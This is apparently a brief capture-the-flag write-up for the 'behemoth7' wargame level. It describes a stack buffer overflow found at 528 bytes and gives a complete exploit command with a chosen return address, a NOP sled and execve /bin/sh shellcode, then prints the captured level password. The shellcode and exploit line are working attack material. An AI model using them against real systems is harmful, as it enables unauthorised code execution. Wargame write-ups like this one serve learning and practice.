using ltrace, we see that the code goes through every env variable and sets it to 0,  
then we try the good old buffer overflow  

we see that at 528 bytes it crashes, and after looking into some adresses, we choose 0xffffd840,  
and we pad the shellcode with tons of NOP (0x90) instructions  

./behemoth7 $(python -c "print 'A'*528+'\x40\xd8\xff\xff'+'\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\
								xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
we have shell  
we get:  
pheewij7Ae  
